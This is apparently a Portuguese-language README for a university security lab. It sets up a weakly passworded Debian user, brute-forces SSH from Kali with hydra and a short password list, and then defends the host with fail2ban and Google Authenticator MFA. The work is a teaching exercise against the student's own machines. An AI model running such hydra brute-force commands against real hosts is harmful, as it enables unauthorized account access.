# SI-Prova6

# Apresentação

[Link da Apresentação](https://youtu.be/QlvAJISp-SI)

# Papéis de cada máquina 

## Vítima
Debian (NAT + Rede Interna) <br>
sudo ifconfig eth0 192.168.1.10 netmask 255.255.255.0 up <br>

## Atacante
Kali (Rede Interna) <br>
sudo ifconfig eth0 192.168.1.11 netmask 255.255.255.0 up <br>

# Fase 1, ataque pelo SSH

## Novo usuário com senha fraca e Instalando ssh
(no Debian) <br>
sudo adduser funcionario <br>
(senha password) <br>
(apertar ENTER pra tudo que vier depois) <br>
sudo apt install openssh-server <br>

## Ataque 
(No Kali) <br>
nano senhas.txt <br>
(escreva as linhas abaixo) <br>
iftm <br>
password <br> 
admin123 <br>
mudar123 <br>
123456 <br> 
security <br>
qwerty <br>
(salvar o arquivo) <br>
hydra -l funcionario -P senhas.txt ssh://192.168.1.10 -t 4 <br>

# Fase 2, defesa e aplicação do MFA

## Fail2ban
(no Debian) <br>
su - <br>
apt update <br>
apt install fail2ban -y <br>
systemctl enable fail2ban <br>
systemctl start fail2ban <br>
fail2ban-client status sshd <br>

## Autenticação de Dois Fatores
(no Debian) <br>
su - <br>
apt install libpam-google-authenticator -y <br>
google-authenticator <br>
(logar no celular e dar "y" para tudo) <br>
exit <br>

## Ativar MFA para acesso SSH
(no Debian) <br>
nano /etc/pam.d/sshd <br>
(na última linha do arquivo adicione:) <br>
auth required pam_google_authenticator.so <br>
(salvar arquivo) <br>
nano /etc/ssh/sshd_config <br>
(na frente de "KbdInteractiveAuthentication" troque "no" para "yes") <br>
(salvar arquivo) <br>
systemctl restart ssh <br>
sudo reboot <br>

## Teste na prática
(no Kali) <br>
hydra -l funcionario -P senhas.txt ssh://192.168.1.10 -t 4 <br>
ssh funcionario@192.168.1.10 <br>
